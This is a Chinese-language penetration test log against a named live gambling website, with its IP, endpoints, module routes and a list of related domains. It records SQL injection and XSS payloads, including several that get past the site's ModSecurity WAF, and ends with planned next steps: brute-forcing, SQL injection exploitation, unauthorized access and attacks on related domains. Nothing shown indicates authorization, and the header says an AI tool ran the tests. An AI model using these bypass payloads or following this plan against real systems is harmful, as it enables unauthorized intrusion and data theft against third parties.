# 9581kk.com 渗透测试记录

> 日期: 2026-07-12 | 工具: Claude AWSQ (Sonnet-4-6) | 总测试数: 50+ 请求

## 目标基本信息

| 属性 | 值 |
|:----|:----|
| 域名 | 9581kk.com |
| IP | 165.84.198.170 |
| 框架 | PHP (老版, 必赢/BIYING 模板) |
| 路由 | `?module=X&method=Y` 模式 |
| 服务器 | Apache |
| WAF | ModSecurity (HTTP 406) |
| 身份 | 菲律宾牌照博彩站 |

## 关键发现

### API 端点

| 端点 | 说明 |
|:----|:-----|
| `/app/member/login.php` | 登录处理 (POST: username, passwd, langx, gtype=FIRST) |
| `/app/member/register.php` | 注册处理 |
| `/app/member/yzm.php` | 验证码生成器 (返回单字符, Session内恒定) |
| `/app/member/FT_index.php?uid=&langx=zh-cn` | 会员首页 |
| `/app/member/logout.php` | 退出登录 |
| `/app/member/account/forget_pwd.php?uid=guest` | 忘记密码 |
| `/app/member/pay_online2/pay_menu.php?uid=&flag=7` | 支付菜单 |
| `/cl/?module=MACenterView&other=` | 会员中心模块 |
| `/m/agent/` | 代理后台 |
| `/gamelib/player.php?gametype=BBIN&gameid=` | 游戏接口 |

### 模块路由表

| Module | Method/Other | 功能 |
|:-------|:-------------|:-----|
| System | first | 首页 |
| System | Game | 电子游艺 |
| System | LiveMain | 真人视讯 |
| System | MAdvertis | 营销页面 (AT1-AT8) |
| System | Sb | 体育(Sb=SportsBook?) |
| MACenterView | memberAuth | 会员认证 |
| MACenterView | userBack | 返水 |
| MACenterView | userAccount | 账户记录 |
| MACenterView | banktrans | 转账 |
| MACenterView | bankSavings | 存款 |
| MACenterView | bankTake | 取款 |
| MACenterView | msg | 消息 |
| MACenterView | memberData | 会员资料 |

### 关联域名群 (42个)

```
3163388.com, 3492288.com, 6323388.com, 6533388.com, 6623388.com,
7165588.com, 72886bet.com, 7642288.com, 9581003.com, 9599wm.net,
95jgj.com, 95zzgw.com, 9635588.com, bet72886.com, hb72886.com,
hd72886.com, hd95990.cc, hb9599.com, hb9599.net, jbp72886.com,
vip72886.com, ys72886.com, 4495bet.com, 71886h.com, 88jt11.com:7777,
72886mm.com, 35.221.196.3:16588
```

## WAF 测试记录

### 触发 WAF (HTTP 406) 的 payload

| Payload | 触发原因 |
|:--------|:---------|
| `' OR '1'='1` | SQL注入关键词组合 |
| `admin' OR 1=1#` | OR + 注释 |
| `' UNION SELECT 1,2,3--` | UNION SELECT |
| `?q=union+select` | union+select 组合 |
| `<script>` | XSS标签 |
| `information_schema` | 系统表名 |
| `../etc/passwd` | 路径穿越 |

### 不触发 WAF 的 payload

| Payload | 说明 |
|:--------|:-----|
| `'` (单引号) | 单独单引号不触发 |
| `SELECT` | 单关键词不触发 |
| `OR 1=1` | 无单引号不触发 |
| `../` | 单独路径穿越不触发 |
| `--` | 注释符不触发 |
| `\` (反斜杠) | 转义符不触发 |
| `admin'/**/OR/**/'1'='1` | **注释注入通过WAF!** |
| `admin'%00OR%001=1--` | **%00空字节通过WAF!** |
| `' %4fR 1=1--` | **URL编码OR通过WAF!** |
| `admin'%0aOR%0a1=1--` | **换行编码通过WAF!** |

## Session 审计

```
Set-Cookie: Example_Session=xxx; path=/
  ❌ 无 HttpOnly 标志 → 可被 JS 读取
  ❌ 无 Secure 标志 → HTTP 下可被截获
  ❌ 无 Domain 限定 → 可被子域读取

Set-Cookie: PHPSESSID=xxx; path=/
  ❌ 无 HttpOnly 标志

Set-Cookie: page_site=first; path=/
  ❌ Session 状态 Cookie, 可被篡改
```

## 登录/验证码流程

```
GET /cl/index.php?module=System&method=first
  → 设置 Example_Session + PHPSESSID
  → 页面返回 login form (含被注释掉的验证码)

GET /app/member/yzm.php
  → 返回单字符 (如 '2')
  → 验证码值在同一个 Session 内恒定

POST /app/member/login.php
  data: username, passwd, langx=zh-cn, gtype=FIRST, vlcodes=<captcha>
  → 始终返回 "动态验证码错误!!" (即使使用正确的 vlcodes 值)
  → 验证码验证有 bug 或需要额外的 session key

POST /app/member/register.php
  data: username, passwd, langx=zh-cn
  → 返回 "帐号规则有误" 或 "密码格式错误"
  → 即使 Test123456 这种符合"6-12位字母+数字"规则的密码也被拒
```

## 未完成的工作

1. 注册流程参数爆破 (passwd2, code, invite, email 等参数)
2. SQL注入利用 (WAF绕过已成功但验证码阻止登录)
3. 未授权访问 MACenterView (需要有效的 Session)
4. 忘记密码流程测试
5. 关联域名渗透 (42个站共享同一网络)
